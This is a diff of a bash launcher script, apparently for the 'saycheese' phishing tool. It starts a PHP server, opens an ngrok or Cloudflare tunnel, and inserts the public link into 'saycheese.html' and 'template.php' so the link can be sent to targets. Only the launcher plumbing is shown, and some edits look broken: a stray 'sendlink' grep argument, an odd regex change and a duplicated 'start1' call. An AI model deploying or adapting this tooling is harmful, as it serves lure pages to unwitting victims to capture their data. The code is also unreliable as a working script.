@@ -122,7 +122,7 @@ fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting server...\e[0m\n"
 
 sleep 3
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -171,14 +171,14 @@ fi
 fi
 fi
 
-#printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
@@ -214,7 +214,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com')
+send_link=$(grep -o 'https://[a-zA-Z0-9]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -224,18 +224,17 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 start() {
 
-default_choose_sub="n"
+default_choose_sub="Y"
 default_subdomain="saycheese$RANDOM"
 
 
-
-#printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 
 choose_sub="y"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
 
-subdomain="n"
+
+subdomain="${subdomain:-${default_subdomain}}"
 fi
 
 server
@@ -245,4 +244,6 @@ checkfound
 }
 banner
 dependencies
+start1
+
 start1
